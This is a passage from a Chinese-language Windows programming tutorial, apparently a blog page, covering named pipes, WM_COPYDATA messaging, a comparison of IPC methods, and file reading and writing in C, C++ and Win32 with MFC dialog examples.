&#123;</span><br><span class="line">        <span class="built_in">TRACE</span>(<span class="string">&quot;CreateFile failed with %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="built_in">MessageBox</span>(_T(<span class="string">&quot;打开命名管道失败！&quot;</span>));</span><br><span class="line">        hNamedPipe = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">MessageBox</span>(<span class="string">&quot;连接成功&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCAppmailslotclientDlg::OnBnClickedSendNameBtn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 命名管道发送</span></span><br><span class="line">    <span class="type">char</span> szBuf[<span class="number">100</span>] = &#123; <span class="string">&quot;Named Pipe coming from client&quot;</span> &#125;;</span><br><span class="line">    DWORD dwWrite;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">WriteFile</span>(hNamedPipe, szBuf, <span class="built_in">strlen</span>(szBuf) + <span class="number">1</span>, &amp;dwWrite, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;写入数据失败&quot;</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hWritePipe);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCAppmailslotclientDlg::OnBnClickedRecvNameBtn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 命名管道接收</span></span><br><span class="line">    <span class="type">char</span> szBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    DWORD dwRead;<span class="comment">//实际读到的长度</span></span><br><span class="line">    <span class="built_in">TRACE</span>(<span class="string">&quot;Begin Read:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hNamedPipe, szBuf, <span class="number">100</span>, &amp;dwRead, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;Read Failed!&quot;</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hReadPipe);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//3 显示数据</span></span><br><span class="line">    <span class="built_in">TRACE</span>(<span class="string">&quot;############## dwRead = %d ########\n&quot;</span>, dwRead);</span><br><span class="line">    <span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h3 id="8-8-进程间通信方式之WM-COPYDATA"><a href="#8-8-进程间通信方式之WM-COPYDATA" class="headerlink" title="8.8 进程间通信方式之WM_COPYDATA"></a>8.8 进程间通信方式之<code>WM_COPYDATA</code></h3><p><code>WM_COPYDATA</code>【WM：Windows Message】，即使用 <code>SendMessage</code>函数发送WM_COPYDATA消息。</p><p>【<code>WM_COPYDATA</code>在进程间通信用的最多】</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果接收方应用程序处理此消息，则应返回TRUE；否则，应返回FALSE</span></span><br><span class="line"><span class="built_in">SendMessageA</span>(</span><br><span class="line">    _In_ HWND hWnd,    <span class="comment">//窗口句柄</span></span><br><span class="line">    _In_ UINT Msg,    <span class="comment">//消息类型，如WM_COPYDATA</span></span><br><span class="line">    _Pre_maybenull_ _Post_valid_ WPARAM wParam,<span class="comment">//传递数据的窗口的句柄</span></span><br><span class="line">    _Pre_maybenull_ _Post_valid_ LPARAM lParam <span class="comment">//指向COPYDATASTRUCT</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//该结构包含要传递的数据</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tagCOPYDATASTRUCT</span> &#123;</span><br><span class="line">  ULONG_PTR dwData;    <span class="comment">//要传递给接收应用程序的数据类型</span></span><br><span class="line">  DWORD     cbData;    <span class="comment">//lpData 成员指向的数据的大小（以字节为单位）</span></span><br><span class="line">  PVOID     lpData;    <span class="comment">//要传递给接收应用程序的数据。 此成员可以为 NULL。</span></span><br><span class="line">&#125; COPYDATASTRUCT, *PCOPYDATASTRUCT;</span><br></pre></td></tr></table></figure><br><p>🔺必备工具【<code>SPY++</code>工具】专门用来查找窗口句柄【窗口搜索，拖动指针即可获得窗口句柄】</p><blockquote><p>要给进程发数据，首先要拿到进程的<span style="background:#5de420">窗口句柄</span>，而窗口句柄由<span style="background:#5de420">标题</span>查找得到。</p></blockquote><p><strong>示例：</strong>【基于命名管道的客户端服务端，服务端新增1个按钮，客户端新增1个按钮】在服务端可创建命名管道并等待客户端连接，然后在客户端连接匿名管道。只要不关闭命名管道，可在任意端点击发送，另一端接收。</p><p><img src="./8-5.png"></p><p>📋发送端【写在服务端】</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCAppmailslotserverDlg::OnBnClickedSendCopydata</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> COPYDATA 发送</span></span><br><span class="line">    CString strWindowsTitle = _T(<span class="string">&quot;客户端&quot;</span>);</span><br><span class="line">    CString strMsg = _T(<span class="string">&quot;COPYDATA is coming&quot;</span>);</span><br><span class="line">    <span class="comment">//利用标题拿到句柄</span></span><br><span class="line">    HWND hWnd = ::<span class="built_in">FindWindow</span>(<span class="literal">NULL</span>, strWindowsTitle.<span class="built_in">GetBuffer</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hWnd != <span class="literal">NULL</span> &amp;&amp; <span class="built_in">IsWindow</span>(hWnd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//数据的封装</span></span><br><span class="line">        COPYDATASTRUCT cpd;</span><br><span class="line">        cpd.dwData = <span class="number">0</span>;<span class="comment">//指定数据类型</span></span><br><span class="line">        cpd.cbData = strMsg.<span class="built_in">GetLength</span>() * <span class="built_in">sizeof</span>(TCHAR);<span class="comment">//发送数据的字节长度</span></span><br><span class="line">        cpd.lpData = (PVOID)strMsg.<span class="built_in">GetBuffer</span>(<span class="number">0</span>);</span><br><span class="line">        ::<span class="built_in">SendMessage</span>(hWnd, WM_COPYDATA, (WPARAM)(<span class="built_in">AfxGetApp</span>()-&gt;m_pMainWnd), (LPARAM)&amp;cpd);</span><br><span class="line">    &#125;</span><br><span class="line">    strWindowsTitle.<span class="built_in">ReleaseBuffer</span>();<span class="comment">//CString可能会内存泄漏</span></span><br><span class="line">    strMsg.<span class="built_in">ReleaseBuffer</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>📋接收端【写在客户端】</p><ul><li>在Dialog设计页面，右击菜单选择【类向导】，在消息中查找 <code>WM_COPYDATA</code>，双击添加【即自动监测<code>COPYDATA</code>消息】</li><li>在自动生成的函数中编写代码</li></ul><p><img src="./8-6.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在自动生成的页面中编写代码</span></span><br><span class="line"><span class="function">BOOL <span class="title">CMFCAppmailslotclientDlg::OnCopyData</span><span class="params">(CWnd* pWnd, COPYDATASTRUCT* pCopyDataStruct)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//消息响应函数</span></span><br><span class="line">    <span class="comment">//解析数据</span></span><br><span class="line">    LPCTSTR szText = (LPCTSTR)(pCopyDataStruct-&gt;lpData);</span><br><span class="line">    DWORD dwLength = (DWORD)pCopyDataStruct-&gt;cbData;</span><br><span class="line">    TCHAR szRecvText[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(szRecvText, szText, dwLength);</span><br><span class="line">    <span class="built_in">MessageBox</span>(szRecvText, _T(<span class="string">&quot;Bingo&quot;</span>), MB_OK);<span class="comment">//BOX的窗口名为Bingo</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> CDialogEx::<span class="built_in">OnCopyData</span>(pWnd, pCopyDataStruct);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><h3 id="8-9-进程间通信方式的比较"><a href="#8-9-进程间通信方式的比较" class="headerlink" title="8.9 进程间通信方式的比较"></a>8.9 进程间通信方式的比较</h3><ul><li><p>剪贴板比较简单；剪切板和匿名管道只能实现同一机器的两个进程通信，而不能实现网络进程之间的通信。</p></li><li><p>邮槽是基于广播的，可以一对多发送；但只能一个发送，一个接收，要想同时发送接收，须各创建一次邮槽。邮槽的缺点传输的数据量很小 424字节以下。</p></li><li><p>命名管道和邮槽可以进行网络通信；命名管道只能是点对点的单一通信。</p></li><li><p><code>WM_COPY_DATA</code> 封装数据和解析数据，非常方便。但如果数据量大，建议用命名管道。</p></li></ul><br><h2 id="九-文件操作"><a href="#九-文件操作" class="headerlink" title="九 文件操作"></a>九 文件操作</h2><p>日志、操作配置文件【<code>ini</code>】、注册表、音视频的文件存储；而且，<code>Linux</code>下一切皆文件！</p><h3 id="9-1-C-C-操作文件"><a href="#9-1-C-C-操作文件" class="headerlink" title="9.1 C/C++操作文件"></a>9.1 C/C++操作文件</h3><h4 id="9-1-1-C语言操作文件"><a href="#9-1-1-C语言操作文件" class="headerlink" title="9.1.1 C语言操作文件"></a>9.1.1 C语言操作文件</h4><p>第一步：打开文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_ACRTIMP FILE* __cdecl <span class="title function_">fopen</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_z_ <span class="type">char</span> <span class="type">const</span>* _FileName,</span></span><br><span class="line"><span class="params">    _In_z_ <span class="type">char</span> <span class="type">const</span>* _Mode</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line">_ACRTIMP <span class="type">errno_t</span> __cdecl <span class="title function_">fopen_s</span><span class="params">(</span></span><br><span class="line"><span class="params">    _Outptr_result_nullonfailure_ FILE**      _Stream,</span></span><br><span class="line"><span class="params">    _In_z_                        <span class="type">char</span> <span class="type">const</span>* _FileName,</span></span><br><span class="line"><span class="params">    _In_z_                        <span class="type">char</span> <span class="type">const</span>* _Mode</span></span><br><span class="line"><span class="params">    )</span>;</span><br></pre></td></tr></table></figure><p>下表列出了文件打开的模式：</p><table><thead><tr><th align="center">文件打开模式</th><th align="center">意义</th></tr></thead><tbody><tr><td align="center">r</td><td align="center">【只读】为读取而打开，如果文件不存在或不能找到，函数调用失败</td></tr><tr><td align="center">w</td><td align="center">【重新写】为写入操作打开一个空文件。如果给定的文件已经存在，那么它的内容将被消空</td></tr><tr><td align="center">a</td><td align="center">【追加】为写入操作打开文件。如果文件已经存在，那么在该文件尾部添加新数据，在写入新的数之前，不会移除文件中已有的EOF标记；如果文件不存在，那么首先创建这个文件</td></tr><tr><td align="center">r+</td><td align="center">【文件必须存在】打开文件用于写入操作和读取操作</td></tr><tr><td align="center">w+</td><td align="center">为写入操作和读取操作打开一个空的文件。如果给定文件已经存在，那么它的内容将被清空</td></tr><tr><td align="center">a+</td><td align="center">打开文件用于读取操作和添加操作。并且，添加操作在添加新数据之前会移除该文件中已有的 EOF标记，然后当写入操作完成之后再恢复EOF标记。如果指定文件不存在，那么首先将创建这个文件</td></tr></tbody></table><p>写文件 | 读文件 | 确定文件偏移量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> _ACRTIMP <span class="type">size_t</span> __cdecl <span class="title function_">fwrite</span><span class="params">(</span></span><br><span class="line"><span class="params">     _In_reads_bytes_(_ElementSize * _ElementCount) <span class="type">void</span> <span class="type">const</span>* _Buffer,</span></span><br><span class="line"><span class="params">     <span class="comment">//元素大小【如字符串的元素是char，大小为1】</span></span></span><br><span class="line"><span class="params">     _In_                                           <span class="type">size_t</span>      _ElementSize,</span></span><br><span class="line"><span class="params">     _In_                                           <span class="type">size_t</span>      _ElementCount,</span></span><br><span class="line"><span class="params">     _Inout_                                        FILE*       _Stream</span></span><br><span class="line"><span class="params">     )</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回值表示当前读文件到缓冲区的大小</span></span><br><span class="line">_ACRTIMP <span class="type">size_t</span> __cdecl <span class="title function_">fread</span><span class="params">(</span></span><br><span class="line"><span class="params">    _Out_writes_bytes_(_ElementSize * _ElementCount) <span class="type">void</span>*  _Buffer,</span></span><br><span class="line"><span class="params">    _In_                                             <span class="type">size_t</span> _ElementSize,</span></span><br><span class="line"><span class="params">    _In_                                             <span class="type">size_t</span> _ElementCount,</span></span><br><span class="line"><span class="params">    _Inout_                                          FILE*  _Stream</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于移动文件内部的位置指针【成功返回0】</span></span><br><span class="line">_ACRTIMP <span class="type">int</span> __cdecl <span class="title function_">fseek</span><span class="params">(</span></span><br><span class="line"><span class="params">    _Inout_ FILE* _Stream,<span class="comment">//指向FILE结构体指针</span></span></span><br><span class="line"><span class="params">    _In_    <span class="type">long</span>  _Offset,<span class="comment">//偏移量，表示从指定的起始位置开始移动的字节数</span></span></span><br><span class="line"><span class="params">    _In_    <span class="type">int</span>   _Origin <span class="comment">//起始位置</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"><span class="comment">/* Seek method constants */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEEK_CUR    1 <span class="comment">//从当前位置开始计算偏移量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEEK_END    2 <span class="comment">//从文件末尾开始计算偏移量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEEK_SET    0 <span class="comment">//从文件开头开始计算偏移量</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//返回文件指针的当前位置</span></span><br><span class="line">_ACRTIMP <span class="type">long</span> __cdecl <span class="title function_">ftell</span><span class="params">(</span></span><br><span class="line"><span class="params">    _Inout_ FILE* _Stream</span></span><br><span class="line"><span class="params">    )</span>;</span><br></pre></td></tr></table></figure><p>📋C语言读写示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCFileDlg::OnBnClickedWriteFile</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//1 C写文件【此处没有使用安全函数fopen_s,需要添加编译宏 | 或在所有选项中禁用4996】</span></span><br><span class="line">    FILE* pFile = <span class="built_in">fopen</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);<span class="comment">//w:重写</span></span><br><span class="line">    <span class="keyword">if</span> (pFile == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;文件打开失败!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> szBuf[<span class="number">1024</span>] = <span class="string">&quot;C语言操作&quot;</span>;</span><br><span class="line">    <span class="type">int</span> iLen = <span class="built_in">strlen</span>(szBuf) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fwrite</span>(szBuf, <span class="number">1</span>, iLen, pFile) &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;文件写入失败!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fclose</span>(pFile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCFileDlg::OnBnClickedReadFile2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//1 C读文件</span></span><br><span class="line">    FILE* pFile = <span class="built_in">fopen</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);<span class="comment">//r:只读</span></span><br><span class="line">    <span class="keyword">if</span> (pFile == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;文件打开失败!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> szBuf[<span class="number">1024</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">//int iLen=fread(szBuf, 1, 1024, pFile);//此处的1024只是猜测，使用fseek确定</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//用于移动文件内部的位置指针</span></span><br><span class="line">    <span class="built_in">fseek</span>(pFile, <span class="number">0</span>, SEEK_END);<span class="comment">//从起始到结尾的偏移量</span></span><br><span class="line">    <span class="comment">//得到文件当前位置</span></span><br><span class="line">    <span class="type">int</span> iFileLen = <span class="built_in">ftell</span>(pFile);</span><br><span class="line">    <span class="comment">//在将文件内部指针设置会文件开始</span></span><br><span class="line">    <span class="built_in">fseek</span>(pFile, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    <span class="comment">//返回值表示当前读文件到缓冲区的大小，可能读多次</span></span><br><span class="line">    <span class="type">int</span> iLen = <span class="built_in">fread</span>(szBuf, <span class="number">1</span>, iFileLen, pFile);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fclose</span>(pFile);</span><br><span class="line">    <span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h4 id="9-1-2-C-操作文件"><a href="#9-1-2-C-操作文件" class="headerlink" title="9.1.2 C++操作文件"></a>9.1.2 C++操作文件</h4><p>C++文件流是用于进行文件读写操作的工具，它提供了一种能够简单、高效地与外部文件进行交互的方式。C++中文件流主要通过<code>ofstream</code>和<code>ifstream</code>来实现对文件的写入和读取。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建ofstream对象</span></span><br><span class="line">std::ofstream outputFile;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打开文件并写入内容</span></span><br><span class="line">outputFile.<span class="built_in">open</span>(<span class="string">&quot;example.txt&quot;</span>); <span class="comment">// 打开名为example.txt的文件进行写入</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (outputFile.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">    outputFile &lt;&lt; <span class="string">&quot;Hello, World!&quot;</span> &lt;&lt; std::endl; <span class="comment">// 将字符串写入文件</span></span><br><span class="line">    outputFile &lt;&lt; <span class="string">&quot;This is a sample text.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Failed to open the file.&quot;</span> &lt;&lt; std::endl; <span class="comment">// 如果文件打开失败，输出错误信息</span></span><br><span class="line">&#125;</span><br><span class="line">outputFile.<span class="built_in">close</span>(); <span class="comment">// 关闭文件流</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// open函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, ios::openmode mode)</span></span>;</span><br><span class="line"><span class="comment">//第一参数指定要打开的文件的名称和位置</span></span><br><span class="line"><span class="comment">//第二个参数定义文件被打开的模式</span></span><br><span class="line"><span class="comment">//ios::app （append）追加模式。所有写入都追加到文件末尾</span></span><br><span class="line"><span class="comment">//ios::ate （at end）文件打开后定位到文件末尾</span></span><br><span class="line"><span class="comment">//ios::in 打开文件用于读取</span></span><br><span class="line"><span class="comment">//ios::out 打开文件用于写入</span></span><br><span class="line"><span class="comment">//ios::trunc（truncate）如果该文件已经存在，其内容将在打开文件之前被截断，即把文件长度设为 0。</span></span><br></pre></td></tr></table></figure><br><p>📋C++读写示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCFileDlg::OnBnClickedWriteFile2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// C++ 写文件</span></span><br><span class="line">    <span class="function">std::ofstream  <span class="title">ofs</span><span class="params">(<span class="string">&quot;2.txt&quot;</span>)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//USES_CONVERSION;</span></span><br><span class="line">    <span class="comment">//CString* strBuf = A2W(pBuf);</span></span><br><span class="line">    <span class="type">char</span> szBuf[<span class="number">1024</span>] = <span class="string">&quot;C++语言操作&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    ofs.<span class="built_in">write</span>(szBuf, <span class="built_in">strlen</span>(szBuf));</span><br><span class="line">    ofs.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCFileDlg::OnBnClickedReadFile2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// C++ 读文件</span></span><br><span class="line">    <span class="function">std::ifstream  <span class="title">ifs</span><span class="params">(<span class="string">&quot;2.txt&quot;</span>)</span></span>;</span><br><span class="line">    <span class="type">char</span> szBuf[<span class="number">1024</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    ifs.<span class="built_in">read</span>(szBuf, <span class="number">1024</span>);</span><br><span class="line">    ifs.<span class="built_in">close</span>();</span><br><span class="line">    <span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h4 id="9-1-3-Win32-API"><a href="#9-1-3-Win32-API" class="headerlink" title="9.1.3 Win32 API"></a>9.1.3 Win32 API</h4><p><code>CreateFile</code>：文件、管道、油槽、通信资源、磁盘设备、控制台、目录</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对C语言的封装</span></span><br><span class="line"><span class="function">HANDLE <span class="title">CreateFileW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           LPCWSTR               lpFileName,<span class="comment">//创建或打开的对象的名称</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD                 dwDesiredAccess,<span class="comment">//访问方式 读，读-写 写 查询</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD                 dwShareMode,<span class="comment">//共享方式 0|NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes,<span class="comment">//默认NULL 不能被子进程继承</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD                 dwCreationDisposition,<span class="comment">//如何创建文件 CREATE_NEW CREATE_ALWAYS </span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD                 dwFlagsAndAttributes,<span class="comment">//设置文件的属性和标志</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] HANDLE                hTemplateFile<span class="comment">//默认NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// dwDesiredAccess</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GENERIC_READ                     (0x80000000L)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GENERIC_WRITE                    (0x40000000L)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GENERIC_EXECUTE                  (0x20000000L)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GENERIC_ALL                      (0x10000000L)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">WriteFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE       hFile,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCVOID      lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD        nNumberOfBytesToWrite,<span 